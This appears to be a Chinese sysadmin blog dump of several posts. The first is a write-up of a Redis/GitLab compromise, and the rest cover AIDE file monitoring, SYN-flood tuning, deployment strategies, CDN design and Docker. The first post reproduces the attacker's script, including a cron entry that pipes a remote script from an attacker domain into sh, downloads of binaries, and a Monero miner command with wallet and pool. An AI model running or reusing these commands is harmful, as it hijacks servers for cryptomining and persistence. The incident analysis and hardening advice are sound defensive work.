auxf|grep -v grep|grep \"/opt/cron\"|awk '&#123;print $2&#125;'|xargs kill -9▽ps auxf|grep -v grep|grep \"/usr/sbin/ntp\"|awk '&#123;print $2&#125;'|xargs kill -9ps auxf|grep -v grep|grep \"/opt/minerd\"|awk '&#123;print $2&#125;'|xargs kill -9ps auxf|grep -v grep|grep \"mine.moneropool.com\"|awk '&#123;print $2&#125;'|xargs kill -9ps auxf|grep -v grep|grep \"xmr.crypto-pool.fr:8080\"|awk '&#123;print $2&#125;'|xargs kill -9#/opt/minerd -h#if [ $? != \"0\" ]; then #ps auxf|grep -v grep|grep \"/opt/minerd\" #if [ $? != \"0\" ]; then #if [ ! -f /opt/yam ]; then #curl -fsSL http://www.haveabitchin.com/yam -o /opt/yam #fi #chmod +x /opt/yam &amp;&amp; /opt/yam -c x -M stratum+tcp://4Ab9s1RRpueZN2XxTM3vDWEHcmsMoEMW3YYsbGUwQSrNDfgMKVV8GAofToNfyiBwocDYzwY5pjpsMB7MY8v4tkDU71oWpDC:x@xmr.crypto-pool.fr:443/xmr #fi#fiDoMiner()&#123; if [ ! -f \"/tmp/AnXqV\" ]; then curl -fsSL http://www.haveabitchin.com/minerd -o /tmp/AnXqV fi chmod +x /tmp/AnXqV /tmp/AnXqV -B -a cryptonight -o stratum+tcp://xmr.crypto-pool.fr:443 -u 4Ab9s1RRpueZN2XxTM3vDWEHcmsMoEMW3YYsbGUwQSrNDfgMKVV8GAofToNfyiBwocDYzwY5pjpsMB7MY8v4tkDU71oWpDC -p x&#125;ps auxf|grep -v grep|grep \"4Ab9s1RRpueZN2XxTM3vDWEHcmsMoEMW3YYsbGUwQSrNDfgMKVV8GAofToNfyiBwocDYzwY5pjpsMB7MY8v4tkDU71oWpDC\" || DoMinerDoRedis6379()&#123; iptables -F REDIS6379 iptables -A REDIS6379 -p tcp -s 127.0.0.1 --dport 6379 -j ACCEPT #iptables -A REDIS6379 -s 0.0.0.0/8 -p tcp --dport 6379 -j ACCEPT #iptables -A REDIS6379 -s 10.0.0.0/8 -p tcp --dport 6379 -j ACCEPT #iptables -A REDIS6379 -s 169.254.0.0/16 -p tcp --dport 6379 -j ACCEPT #iptables -A REDIS6379 -s 172.16.0.0/12 -p tcp --dport 6379 -j ACCEPT #iptables -A REDIS6379 -s 192.168.0.0/16 -p tcp --dport 6379 -j ACCEPT #iptables -A REDIS6379 -s 224.0.0.0/4 -p tcp --dport 6379 -j ACCEPT iptables -A REDIS6379 -p TCP --dport 6379 -j REJECT iptables -I INPUT -j REDIS6379&#125;iptables -D OUTPUT -j REDIS6379iptables -F REDIS6379iptables -X REDIS6379iptables -D INPUT -j REDIS63792iptables -F REDIS63792iptables -X REDIS63792#iptables -N REDIS6379 &amp;&amp; DoRedis6379 分析了一下，它除了自身进程外，还有3个守护进程，而且这5个进程的PID和名称每秒都在变化，估计是在不停的重建吧。 以及添加服务定时执行脚本。 123echo \"*/5 * * * * curl -fsSL http://www.haveabitchin.com/pm.sh?0105008 | sh\" &gt; /var/spool/cron/rootmkdir -p /var/spool/cron/crontabsecho \"*/5 * * * * curl -fsSL http://www.haveabitchin.com/pm.sh?0105008 | sh\" &gt; /var/spool/cron/crontabs/root 下载病毒文件，主要是截取我6379这个端口，提权，等等信息，这个文件对方做过加密的。 12345678910if [ ! -f \"/tmp/ddg.217\" ]; then curl -fsSL http://www.haveabitchin.com/ddg.$(uname -m) -o /tmp/ddg.217fichmod +x /tmp/ddg.217 &amp;&amp; /tmp/ddg.217killall /tmp/ddg.216if [ -d \"/opt/yam\" ]; then rm -rf /opt/yamfi 第二个病毒文件，反向代理肉鸡的木马，也加密过的。下载放到/tmp/下面 这个是临时文件。 123456789DoMiner()&#123; if [ ! -f \"/tmp/AnXqV\" ]; then curl -fsSL http://www.haveabitchin.com/minerd -o /tmp/AnXqV fi chmod +x /tmp/AnXqV /tmp/AnXqV -B -a cryptonight -o stratum+tcp://xmr.crypto-pool.fr:443 -u 4Ab9s1RRpueZN2XxTM3vDWEHcmsMoEMW3YYsbGUwQSrNDfgMKVV8GAofToNfyiBwocDYzwY5pjpsMB7MY8v4tkDU71oWpDC -p x&#125;ps auxf|grep -v grep|grep \"4Ab9s1RRpueZN2XxTM3vDWEHcmsMoEMW3YYsbGUwQSrNDfgMKVV8GAofToNfyiBwocDYzwY5pjpsMB7MY8v4tkDU71oWpDC\" || DoMiner 对方配置的防火墙规则： 6379 本地访问。 1234567891011121314151617181920DoRedis6379()&#123; iptables -F REDIS6379 iptables -A REDIS6379 -p tcp -s 127.0.0.1 --dport 6379 -j ACCEPT //只允许127.0.0.1访问6379 #iptables -A REDIS6379 -s 0.0.0.0/8 -p tcp --dport 6379 -j ACCEPT #iptables -A REDIS6379 -s 10.0.0.0/8 -p tcp --dport 6379 -j ACCEPT #iptables -A REDIS6379 -s 169.254.0.0/16 -p tcp --dport 6379 -j ACCEPT #iptables -A REDIS6379 -s 172.16.0.0/12 -p tcp --dport 6379 -j ACCEPT #iptables -A REDIS6379 -s 192.168.0.0/16 -p tcp --dport 6379 -j ACCEPT #iptables -A REDIS6379 -s 224.0.0.0/4 -p tcp --dport 6379 -j ACCEPT iptables -A REDIS6379 -p TCP --dport 6379 -j REJECT iptables -I INPUT -j REDIS6379&#125;iptables -D OUTPUT -j REDIS6379iptables -F REDIS6379iptables -X REDIS6379iptables -D INPUT -j REDIS63792iptables -F REDIS63792iptables -X REDIS63792#iptables -N REDIS6379 &amp;&amp; DoRedis6379 删除这些文件，在看看就没问题了，后面把redis设置了。 我们当初设置了反向代理和防火墙规则，权限设置了很细，只能普通用户启动服务。 总结： 这次发生破灭性的攻击，总结经验这里gitlab走redis单独走本地：设置：bind单独本地跑。127.0.0.1 第二：普通用户启动redis，第三：设置防火墙。","link":"/2016/12/02/运维安全/gitlab网站被黑redis被劫持6379端口需要提交认证，如何挽救？/"},{"title":"使用AIDE做Linux高级入侵检测文件监控","text":"1、aide介绍 AIDE(Adevanced Intrusion Detection Environment,高级入侵检测环境)是个入侵检测工具，主要用途是检查文本的完整性。 AIDE能够构造一个指定文档的数据库，他使用aide.conf作为其配置文档。AIDE数据库能够保存文档的各种属性，包括：权限(permission)、索引节点序号(inode number)、所属用户(user)、所属用户组(group)、文档大小、最后修改时间(mtime)、创建时间(ctime)、最后访问时间(atime)、增加的大小连同连接数。AIDE还能够使用下列算法：sha1、md5、rmd160、tiger，以密文形式建立每个文档的校验码或散列号。 常见的入侵检测软件： tripwire–操作比较复杂,aide–用以代替tripwire,比较简单. 系统环境： RHEL 6.2 [2.6.32-220.el6.i686] 软件环境： 2、aide安装 配置使用yum rpm二进制安装 1yum -y install aide 我的配置文件 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227mv /etc/aide.conf /etc/aide.conf.bakvim /etc/aide.conf # Example configuration file for AIDE.@@define DBDIR /var/lib/aide #基准数据库目录@@define LOGDIR /var/log/aide #日志目录 # The location of the database to be read.database=file:@@&#123;DBDIR&#125;/aide.db.gz #基础数据库文件 # The location of the database to be written. #database_out=sql:host:port:database:login_name:passwd:table#database_out=file:aide.db.newdatabase_out=file:@@&#123;DBDIR&#125;/aide.db.new.gz #更新数据库文件 # Whether to gzip the output to databasegzip_dbout=yes # Default.verbose=5 report_url=file:@@&#123;LOGDIR&#125;/aide.logreport_url=stdout#report_url=stderr#NOT IMPLEMENTED report_url=mailto:root@foo.com#NOT IMPLEMENTED report_url=syslog:LOG_AUTH # These are the default rules.##p: permissions#i: inode:#n: number of links#u: user#g: group#s: size#b: block count#m: mtime#a: atime#c: ctime#S: check for growing size#acl: Access Control Lists#selinux SELinux security context#xattrs: Extended file attributes#md5: md5 checksum#sha1: sha1 checksum#sha256: sha256 checksum#sha512: sha512 checksum#rmd160: rmd160 checksum#tiger: tiger checksum #haval: haval checksum (MHASH only)#gost: gost checksum (MHASH only)#crc32: crc32 checksum (MHASH only)#whirlpool: whirlpool checksum (MHASH only) #R: p+i+n+u+g+s+m+c+acl+selinux+xattrs+md5#L: p+i+n+u+g+acl+selinux+xattrs#E: Empty group#&gt;: Growing logfile p+u+g+i+n+S+acl+selinux+xattrsR = p+i+n+u+g+s+m+c+acl+selinux+xattrs+md5L = p+i+n+u+g+acl+selinux+xattrs&gt; = p+u+g+i+n+S+acl+selinux+xattrs # You can create custom rules like this.# With MHASH...# ALLXTRAHASHES = sha1+rmd160+sha256+sha512+whirlpool+tiger+haval+gost+crc32ALLXTRAHASHES = sha1+rmd160+sha256+sha512+tiger# Everything but access time (Ie. all changes)EVERYTHING = R+ALLXTRAHASHES # Sane, with multiple hashes# NORMAL = R+rmd160+sha256+whirlpoolNORMAL = R+rmd160+sha256 # For directories, don't bother doing hashesDIR = p+i+n+u+g+acl+selinux+xattrs # Access control only PERMS = p+i+u+g+acl+selinux # Logfile are special, in that they often change LOG = &gt; # Just do md5 and sha256 hashes LSPP = R+sha256 # Some files get updated automatically, so the inode/ctime/mtime change # but we want to know when the data inside them changes DATAONLY = p+n+u+g+s+acl+selinux+xattrs+md5+sha256+rmd160+tiger # Next decide what directories/files you want in the database. /boot NORMAL/bin NORMAL/sbin NORMAL/lib NORMAL/lib64 NORMAL/opt NORMAL/usr NORMAL/root NORMAL# These are too volatile!/usr/src!/usr/tmp!/usr/share #通过文件路径前面加感叹号 ! 排除这个路径的监控,请自定义 # Check only permissions, inode, user and group for /etc, but# cover some important files closely./etc PERMS!/etc/mtab # Ignore backup files!/etc/.*~/etc/exports NORMAL/etc/fstab NORMAL/etc/passwd NORMAL/etc/group NORMAL/etc/gshadow NORMAL/etc/shadow NORMAL/etc/security/opasswd NORMAL /etc/hosts.allow NORMAL/etc/hosts.deny NORMAL /etc/sudoers NORMAL/etc/skel NORMAL /etc/logrotate.d NORMAL /etc/resolv.conf DATAONLY /etc/nscd.conf NORMAL/etc/securetty NORMAL # Shell/X starting files/etc/profile NORMAL/etc/bashrc NORMAL/etc/bash_completion.d/ NORMAL/etc/login.defs NORMAL/etc/zprofile NORMAL/etc/zshrc NORMAL/etc/zlogin NORMAL/etc/zlogout NORMAL/etc/profile.d/ NORMAL/etc/X11/ NORMAL # Pkg manager/etc/yum.conf NORMAL/etc/yumex.conf NORMAL/etc/yumex.profiles.conf NORMAL/etc/yum/ NORMAL /etc/yum.repos.d/ NORMAL /var/log LOG /var/run/utmp LOG # This gets new/removes-old filenames daily!/var/log/sa # As we are checking it, we've truncated yesterdays size to zero. !/var/log/aide.log # LSPP rules...# AIDE produces an audit record, so this becomes # /var/log/audit/ LSPP/etc/audit/ LSPP/etc/libaudit.conf LSPP/usr/sbin/stunnel LSPP/var/spool/at LSPP/etc/at.allow LSPP/etc/at.deny LSPP/etc/cron.allow LSPP/etc/cron.deny LSPP/etc/cron.d/ LSPP/etc/cron.daily/ LSPP/etc/cron.hourly/ LSPP/etc/cron.monthly/ LSPP/etc/cron.weekly/ LSPP/etc/crontab LSPP/var/spool/cron/root LSPP /etc/login.defs LSPP/etc/securetty LSPP/var/log/faillog LSPP/var/log/lastlog LSPP /etc/hosts LSPP/etc/sysconfig LSPP /etc/inittab LSPP/etc/grub/ LSPP/etc/rc.d LSPP /etc/ld.so.conf LSPP /etc/localtime LSPP /etc/sysctl.conf LSPP /etc/modprobe.conf LSPP /etc/pam.d LSPP/etc/security LSPP/etc/aliases LSPP/etc/postfix LSPP /etc/ssh/sshd_config LSPP /etc/ssh/ssh_config LSPP /etc/stunnel LSPP /etc/vsftpd.ftpusers LSPP /etc/vsftpd LSPP /etc/issue LSPP/etc/issue.net LSPP /etc/cups LSPP # With AIDE's default verbosity level of 5, these would give lots of# warnings upon tree traversal. It might change with future version.##=/lost\\+found DIR#=/home DIR # Ditto /var/log/sa reason...!/var/log/and-httpd # Admins dot files constantly change, just check perms/root/\\..* PERMS 下一步： 初始化监控数据库(这需要一些时间) 123456 /usr/sbin/aide -c /etc/aide.conf --init``` 把当前初始化的数据库作为开始的基础数据库``` bash cp /var/lib/aide/aide.db.new.gz /var/lib/aide/aide.db.gz 如果是正常的改动 更新改动到基础数据库 12aide --updatecd /var/lib/aide/ 覆盖替换旧的数据库 1mv aide.db.new.gz aide.db.gz 在终端中查看检测结果 1aide --check 检查文件改动 保存到文件 1234567 aide --check --report=file:/tmp/aide-report-`date +%Y%m%d`.txt``` 定时任务执行aide检测报告和自动邮件发送aide检测报告(如果没有mail, yum install mail,还需要有本地邮件服务支持, yum install sendmail;/etc/init.d/sendmail start) ``` bash crontab -e 00 02 * * * /usr/sbin/aide -C -V4 | /bin/mail -s \"AIDE REPORT $(date +%Y%m%d)\" root@localhost 5、参考 官网 :http://aide.sourceforge.net/ AIDE –Linux高级入侵检测 http://gupt12.blog.51cto.com/7651206/1263183 参考：http://www.iamle.com/archives/1664.html","link":"/2015/04/01/运维安全/使用AIDE做Linux高级入侵检测文件监控/"},{"title":"httpd进程非常多，查找被攻击的原因","text":"前两天，公司托管在电信机房的vps服务器突然网络中断，运营商那边说我们的服务器不断往外发包，严重影响到机房的网络，所以把该机器的端口封了，无比蛋疼啊，无奈下只能亲自跑到机房解决问题。去到机房，使用top命令查看后发现httpd进程居然占到90%多的CPU。 ps -aux |grep httpd |wc -l 发现有300多个httpd进程应该是受到SYN Flood攻击这时候没有直接杀掉进程，要找出是哪个网站受攻击。 top |grep httpd 选取进程中占用CPU%多的，用lsof -p pid 来查看，如果有几个httpd进程都显示同一个网站，则基本上可以判定该网站就是问题网站 lsof -p &lt;pid&gt; 找到问题网站后停掉该网站vps killall -9 httpd ,service httpd start 强制杀掉http进程，再重新启动。 以下是在网上找的预防SYN flood的办法linux下防止SYN Flood攻击，能够有效防范SYN Flood攻击的手段之一，就是SYN Cookie Linux下设置如果你的服务器配置不太好，TCP TIME_WAIT套接字数量达到两、三万，服务器很容易被拖死。通过修改Linux内核参数，可以减少服务器的TIME_WAIT套接字数量。 TIME_WAIT可以通过以下命令查看： 以下是代码片段： netstat -an | grep &quot;TIME_WAIT&quot; | wc -l 在Linux下，如CentOS，可以通过修改/etc/sysctl.conf文件来达到目的增加以下几行： 以下是代码片段： 12345678910net.ipv4.tcp_fin_timeout = 30net.ipv4.tcp_keepalive_time = 1200net.ipv4.tcp_syncookies = 1net.ipv4.tcp_tw_reuse = 1net.ipv4.tcp_tw_recycle = 1net.ipv4.ip_local_port_range = 1024 65000net.ipv4.tcp_max_syn_backlog = 8192net.ipv4.tcp_max_tw_buckets = 5000net.ipv4.tcp_synack_retries = 2net.ipv4.tcp_syn_retries = 2 说明： net.ipv4.tcp_syncookies = 1表示开启SYN Cookies，这是个BOOLEAN。当出现SYN等待队列溢出时，启用cookies来处理，可防范少量SYN攻击，默认为0，表示关闭；net.ipv4.tcp_tw_reuse = 1 表示开启重用,这是个BOOLEAN。允许将TIME-WAIT sockets重新用于新的TCP连接，默认为0，表示关闭；net.ipv4.tcp_tw_recycle = 1表示开启TCP连接中TIME-WAIT sockets的快速回收,这是个BOOLEAN，默认为0，表示关闭。net.ipv4.tcp_fin_timeout = 30 表示如果套接字由本端要求关闭，这个参数决定了它保持在FIN-WAIT-2状态的时间。单位为秒。net.ipv4.tcp_keepalive_time = 1200表示当keepalive起用的时候，TCP发送keepalive消息的频度。缺省是2小时，改为20分钟。单位为秒。net.ipv4.ip_local_port_range = 1024 65000 表示用于向外连接的端口范围。缺省情况下很小：32768到61000，改为1024到65000。net.ipv4.tcp_max_syn_backlog = 8192表示SYN队列的长度，默认为1024，加大队列长度为8192，可以容纳更多等待连接的网络连接数。net.ipv4.tcp_max_tw_buckets = 5000 表示系统同时保持TIME_WAIT套接字的最大数量，如果超过这个数字，TIME_WAIT套接字将立刻被清除并打印警告信息。默认为180000，改为5000。对于Apache、Nginx等服务器，上几行的参数可以很好地减少TIME_WAIT套接字数量，但是对于Squid，效果却不大。此项参数可以控制TIME_WAIT套接字的最大数量，避免Squid服务器被大量的TIME_WAIT套接字拖死。net.ipv4.tcp_synack_retries和net.ipv4.tcp_syn_retries是定义SYN重试次数。 执行以下命令使配置生效： 以下是代码片段：/sbin/sysctl -p 如果你不想修改/etc/sysctl.conf，你也可以直接使用命令修改: 以下是代码片段： /sbin/sysctl -w key=value 找漏洞：重新审视了M站目录下文件权限。仅对几个必要的缓存、静态化的目录为apache开启了写权限，防止phzLtoxn.php文件再次生成。 重新开启httpd服务，使用360网站检测对H站进行漏洞检测，发现M站中有严重的远程执行漏洞，于是赶紧打了补丁。 补丁打好之后，顺便修改了系统用户、数据库用户、ftp用户的密码、M站系统用户密码。观察几日之后，一切正常。","link":"/2014/09/13/运维安全/httpd进程非常多，查找被攻击的原因/"},{"title":"APP自动化部署:开发部署-测试部署-灰度发布/蓝绿部署-生产环境等部署流程方案总结","text":"APP自动化部署：开发部署、测试部署、灰度发布等部署方案对比与总结前言：个人现在在一个医疗行业公司：美年大这边负责体检APP的运维相关工作，今天主要是整理了下现在团队APP发布流程方案： 因为在项目迭代的过程中，不可避免需要”上线”。上线对应着部署，或者重新部署；部署对应着修改；修改则意味着风险。目前有很多用于部署的技术，有的简单，有的复杂；有的得停机，有的不需要停机即可完成部署。 个人整理下部署流程说明其实现在很多部署方法，现在我们用目前比较流行的几种部署方案，或者说策略方案对比总结简单讨论一下目前比较流行的几种部署方案，或者说策略。如有不足之处请指出，如有谬误，请指正^_^。 我们有自己开发环境和测试环境 ： 开发环境部署： 问题： 开发人员每个人在自己电脑环境写代码自己电脑本机测试代码是否run成功，每个开发人员都在自己本地写完测试出现问题是各自环境不统一导致遇到坑阻碍到测试人员测试，基础的bug也会浪费太多时间。 解决后： 主要是解决了给予开发团队在写代码或者修改bug可以第一时间更新部署。大家统一一个开发环境这个是为了在开发阶段能立马呈现效果。 测试环境部署： 问题： 一开始没有测试环境，直接开发环境当作测试环境去跑，发现很多问题，就是测试环境数据跟生产不一样，导致很多bug问题，测试发现测试的时候，开发在更新代码发布，耽误了测试人员的测试过程，环境不能独立都互相占用，刀子效率没有提高，bug每个星期都不断提升。 解决后： 主要解决了开发环境和测试环境独立，不会互相影响，测试人员有单独环境去测试生产能准确的数据对比。 选择灰度环境部署方案：先贴个百度百科： 灰度发布是指在黑与白之间，能够平滑过渡的一种发布方式。AB test就是一种灰度发布方式，让一部分用户继续用A，一部分用户开始用B，如果用户对B没有什么反对意见，那么逐步扩大范围，把所有用户都迁移到B上面来。灰度发布可以保证整体系统的稳定，在初始灰度的时候就可以发现、调整问题，以保证其影响度。 灰度环境部署: 个人理解灰度部署是增量发布的一种类型，它的执行方式是在原有软件生产版本可用的情况下，同时部署一个新的版本。同时运行同一个软件产品的多个版本需要软件针对配置和完美自动化部署进行特别设计。 1234567(1) 准备好部署各个阶段的工件，包括：构建工件，测试脚本，配置文件和部署清单文件。(2) 从负载均衡列表中移除掉“部署灰度环境”服务器。(3) 升级“灰度部署”应用（排掉原有流量并进行部署）。(4) 对应用进行自动化测试。(5) 将“灰度环境”服务器重新添加到负载均衡列表中（连通性和健康检查）。(6) 如果“灰度环境”在线使用测试成功，升级剩余的其他服务器。（否则就回滚）灰度发布中，常常按照用户设置路由权重，例如90%的用户维持使用老版本，10%的用户尝鲜新版本。不同版本应用共存，经常与A/B测试一起使用，用于测试选择多种方案。灰度发布比较典型的例子 第1步: 把绿色集群的状态改为’备用’. 从负载均衡的池里把这些地址去掉,这样,绿色的集群就不再回接收到来自用户的请求了.转而进入备用负载均衡的池里. 选择蓝绿环境部署方案：蓝绿发布的意义整个发布过程，用户没有感受到任何宕机或者服务重启。 蓝绿发布的过程 第0步:部署以前的配置.png) 第1步: 把绿色集群的状态改为’备用’. 从负载均衡的池里把这些地址去掉,这样,绿色的集群就不再回接收到来自用户的请求了.转而进入备用负载均衡的池里..png) 第2步:在绿色集群里部署新的代码,直到应用启动成功.png) 第3步:使用备用负载均衡简单测试一下备用集群的部署情况.理想状态下是全自动的. 第4步:把绿色备用集群的状态改成存货,于是进入了存活负载均衡的池里.png)看到 蓝色运行v1版本,绿色运行v2版本,都连接的是相同的数据库.这意味着v2版本也要在老的数据模型上运行.如果数据库有变更,要等到所有的集群升级到新的代码上. 第5步: 对蓝色集群也进行同样的操作..png).png) 最终v2代码完成部署..png) 第6步:根据情况.运行数据库迁移 参考：tks green-deployment 总结：1) 蓝绿部署：不停止老版本，额外搞一套新版本，等测试发现新版本OK后，删除老版本。其实这里删除老版本也就是重新部署了老版本成为新版本一起放上去，等需要更新发布迁下期中一个版本环境部署：现在我们公司使用蓝绿部署方案。 3) 灰度发布：不停止老版本，额外搞一套新版本，常常按照用户设置路由权重，例如90%的用户维持使用老版本，10%的用户尝鲜新版本。不同版本应用共存，经常与A/B测试一起使用，用于测试选择多种方案。 其实两种含义个人认为相差不是特别大，都特别适合现在发布部署流程方案。交流学习：🐧 Linux shell_高级运维派: 459096184 圈子 (系统运维-应用运维-自动化运维-虚拟化技术研究欢迎加入)🐧 BigData-Exchange School : 521621407 圈子（大数据运维)（Hadoop开发人员)（大数据研究爱好者) 欢迎加入 相应Bidata有内部微信交流群互相学习，加入QQ群有链接。","link":"/2017/03/15/运维笔记/APP自动化部署:开发部署-测试部署-灰度发布:蓝绿部署-生产环境等部署流程方案总结/"},{"title":"【翻译】监控不只是为了处理故障","text":"【翻译】监控不只是为了处理故障有一种普遍的想法认为监控只是在系统出错的时候能够发出报警，我们一直相信，监控系统的方方面面给予我们洞察业务内部机制的能力，并驱动我们做出决策。不同的人有不同的监控方式，手动查看日志，接受报警或者24x7值守查看各种图表。不管你用那种方式，最重要的是及时收到报错和警告。但是监控其实能做的更多。 监控不止用于故障时候发报警 监控系统不应该只是告诉你“这有一个问题”，它也要帮助你排查问题出现的原因,你不只是想在服务变慢的时候收到报警，你其实想知道过去几小时流量是否增加了，机器是不是宕机了，后端服务器是不是变慢了或者内部执行时间变长了。 在你的应用中集成监控模块 做为报警和排错重要手段，监控要在你的架构体系中拥有核心位置。要集成监控工具在你的所有代码逻辑中，而不仅仅是在边缘区域添加一点。跟踪每个请求提交api需要多少组件，以便你在设计新的存储系统是否能够知道要处理多少数据，跟踪内存的命中率，以便你能度量它们随着流量模式变化的规律，甚至分解到memcached中来节省内存和提高命中率。跟踪用户命中你的业务逻辑的”慢路径“，以便你知道它什么时候可以更快，并且当新的功能使用”慢路径“的时候，你已经准备好了让它”延迟命中“。在你的代码内部，做这样大量的细节工作，可以让你前进的更快，技术和产品决策会受益良多，根本上提升了你的效率。这就是监控的意义所在，监控不只是为了处理故障。 原文 https://www.robustperception.io/monitoring-not-just-for-outages/ 交流学习：🐧 Linux shell_高级运维派: 459096184 圈子 (系统运维-应用运维-自动化运维-虚拟化技术研究欢迎加入)🐧 BigData-Exchange School : 521621407 圈子（大数据运维)（Hadoop开发人员)（大数据研究爱好者) 欢迎加入 相应Bidata有内部微信交流群互相学习，加入QQ群有链接。","link":"/2017/04/05/运维笔记/【翻译】监控不只是为了处理故障/"},{"title":"CDN加速助力高并发网站架构","text":"CDN加速助力高并发网站架构 架构说明：用户通过互联网访问网站需要经过的节点如下： 一、要通过域名解析在域名解析处有两种方式1、自建，自建需要在域名解析前架设防火墙。 2、使用现有的域名解析提供商，需要设置成CNAME,其实就是另一个域名解析，进行跳转。在刚开始的时候建议先用CNAME方式，部署不影响用户现有方式，容易被用户接受，而且不用暂时不用担心第一级dns的问题。 总之，如果要建设idc加速，防止ddos攻击之类的服务，域名解析服务一定要提供，不管是直接提供dns服务还是间接通过cname转发。里面的主要技术，是通过用户请求的ip来得到离用户最近的服务器的地址，并通过它来提供服务。如果要进行安全防护，比如sql注入检查，js跨站脚本等可以在这一层进行处理。 二、提供虚拟机虚拟机现在主流有两种方式，一是虚拟主机，主要的软件有开源的openvz，商用的Virtuozzo等,另一类是虚拟机如vmware、xen、kvm等，这类提供虚拟操作系统，可以是异构的。他们两个的对比主要是虚拟主机的利用率比较高，可以一台主流pcserver可以虚拟几十个到上百个虚拟主机，但只能是同一类操作系统。虚拟机的运行效率相对低很多，一般主流pcserver也就十几个左右。他的有点是异构操作系统，备份管理比较方便。当然在建设的时候可以先用虚拟机，然后在虚拟机上建设虚拟主机。 如果要提供对外服务，ip地址是比不可少的，对于一个用户来说，一个域名需要几个点，就需要几个ip。 三、LVS集群由于要提供加速等服务，用户直接使用的openvz虚拟主机的性能和效率一般不大，又要提供高可用性，所以需要通过虚拟主机访问lvs集群的数据，通过lvs集群来提供服务。 四、SquidSquid是缓存，尤其是对静态页面和文件有很好加速效果。sina、sohu等都用它来做缓存加速。 五、Nginx​Nginx主要提供反向代理功能，当通过修改或者更新了页面，由nginx来负责更新缓存。还有就是动态网站，也是由nginx来提供服务。 Nginx和sqid都可以提供静态缓存功能，两者还要结合起来发挥最大效果。如果要进行安全防护，比如sql注入检查，js跨站脚本等可以在这一层进行处理。防DDOS 六、自动化工具+Docker运行Saltstask 自动化工具批量初始化脚本更新监控脚本，增删改查添加缓存机制。上百台服务器节省我们操作时间，物理机运行Docker程序。 防ddos的主要内容由两个方面：一、带宽这个是很重要的地方，据我现在从网上得到的资料，现在主流的idc机房一般最大提供独立百兆端口，而且价格不菲。在这种情况下可以机柜租用。这个还需要调研是否可以提供更大的带宽。 二、防火墙设备需要在接入口部署防火墙，需要根据idc接口端口来确定容量，有的idc机房也提供此服务。 三、流量牵引设备这个一般idc机房会提供此服务，这个根据需要是否需要购买。 交流学习：🐧 Linux shell_高级运维派: 459096184 圈子 (系统运维-应用运维-自动化运维-虚拟化技术研究欢迎加入)🐧 BigData-Exchange School : 521621407 圈子（大数据运维)（Hadoop开发人员)（大数据研究爱好者) 欢迎加入 相应Bidata有内部微信交流群互相学习，加入QQ群有链接。","link":"/2015/07/23/运维笔记/CDN加速助力高并发网站架构/"},{"title":"个人总结：为什要学习docker，如何学习Docker","text":"学习任何一个开源新技术，首先问自己几个问题： 1. 为什要学习它？2. 学习它需要了解哪些相关知识点？3. 如何快速学习？4. 该技术的使用场景是什么？拿我个人的学习经验来举例（本人之前比较了解KVM，ESxi,OpenStack） 为什要学习docker？个人回答： 1234567docker是轻量级虚拟化技术，docker使linux容器技术的应用更加简单和标准化docker的速度很快,容器启动时毫秒级的docker将开发和运维职责分清docker解决了依赖地狱问题docker支持几乎所有操作系统docker有着飞速发展的生态圈很多IT巨头逐渐加入和支持 学习它需要了解哪些相关知识点？ 回答： 123456789云计算概念相关（restapi, 微服务，OpenStack）Linux 系统管理（软件包管理，用户管理，进程管理等）Linux 内核相关（Cgroup, namespace 等）Linux 文件系统和存储相关（AUFS，BRFS,devicemapper 等）Linux 网络（网桥，veth,iptables等）Linux安全相关（Appmor,Selinux 等）Linux进程管理（Supervisord,Systemd etc)Linux容器技术（LXC等）开发语言（Python, GO,Shell 等） 3.如何快速学习？ 1234回答：个人体会最好有一个实际的需求或项目来边实践边学习，入门可以参考（第一本docker书）写的不错，非常适合入门。除此之外，阅读牛人的blog比如官方blog http://blog.docker.com/ 最后，参与社区互动也是很好的学习方式。 该技术的使用场景是什么？回答：docker非常适用于dev/test CI/CD 场景，用完就扔。还有就是PasS了。 为什要学习Docker 1.学习Docker，如果没有云计算的基本知识，以及内核的基本知识，那么学习并理解起来会稍吃力。作为容器，Docker容器的优势在哪，不足在哪，最好了解容器的实现是怎样的（简单了解）；拥有镜像管理，Docker又该如何体现软件开发，集成，部署，发布，再迭代的软件生命周期管理优势。以上两点我认为最为关键，有这两方面的认识势必会对之后的工作帮助巨大。 2.关于学习资源，起码的硬件设施总是要有的。Docker及其生态的发展很快，不使用纯理论肯定收效甚微。另外，资源还包括Docker官方，各大电子媒体平台，技术论坛，开源社区等，往往大拿的观点能点破自己的困惑，或者让自己知道哪方面的认识还很欠缺，以及让自己少走很多的弯路。 3.个人兴趣的话，归结为强扭的瓜不甜。起码应该认同Docker的设计价值，以及Docker的未来潜力，当然有依据的批判Docker并带动大家的思考，也是深切关注的表现。 4.个人发展方向，我认为如果需要把Docker当作软件生命周期管理工具的话，那用好Docker最为重要，API及命令的理解与使用是必需的。如果专注系统设计方面，那么除Docker以上的知识与经验之外，若有Docker源码的学习与理解，那么这些肯定会让你的Docker水平提高一个层次。 学习Docker，最大的好处是跟进新技术发展方向。我觉得在校生应该没有多少硬性需求在Docker的研究上，这也是为什么学校没做具体应用要求的原因。最实际的做法是看一些Docker使用案例，自己实践出一些经验应该会再以后的社会实践中起到作用。 研究docker的源代码，应该到你下定决心从事云计算方面的事业或者研究，那么你就需要以研究者的身份去做仔细的源码分析的工作。 Docker火起来的真正原因是什么？我认为有这么几点， 123普通开发者有机会接触容器技术，享受开发发布一体化的便利。容器云是区别于传统IaaS服务的另一种更快速更高效的轻量级选择。基于镜像的第二个GitHub、CI/CD服务、代码发布、在线debug。 交流学习：🐧 Linux shell_高级运维派: 459096184 圈子 (系统运维-应用运维-自动化运维-虚拟化技术研究欢迎加入)🐧 BigData-Exchange School : 521621407 圈子（大数据运维)（Hadoop开发人员)（大数据研究爱好者) 欢迎加入 相应Bidata有内部微信交流群互相学习，加入QQ群有链接。","link":"/2016/10/10/运维笔记/个人总结：为什要学习docker，如何学习Docker/"},{"title":"个人记录💥-走上全栈运维工程师学习笔记","text":"个人运维💥学习笔记：1234567从2014年初就开始慢慢记录自己所接触和学习到的东西，慢慢的积累，整理出很多学习的好文章，在这里我并且记录下来。这是我现在维护的个人笔记库和博客不同，它们大多都不是直接来源于我的原创，而是我一边阅读一边整理加工而成的笔记列表.我的目的是将零散的知识点放在一个集中的地方. 